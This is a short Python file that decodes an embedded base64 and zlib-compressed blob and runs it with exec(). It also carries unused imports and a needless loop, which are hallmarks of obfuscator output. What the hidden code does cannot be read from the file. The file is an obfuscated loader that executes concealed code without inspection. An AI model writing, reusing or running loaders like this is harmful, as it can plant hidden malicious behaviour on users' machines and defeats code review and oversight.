import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'eJwtjDEKhDAQAPt9xXbuggTETvABdj4gzcWsGIhGNrlK/LsBnWqKYcJ+Ji2oAjDNOFYxS9rPEIW0sc76q2v7m6z5jK/+tq5hAC8rbimXTC4mxwNgRaX89cBcn+IpS6FpNms4/C/Gt2OGB3buJPA='
_d = None
while True:
    _d = zlib.decompress(base64.b64decode(_p))
    break
exec(_d.decode())
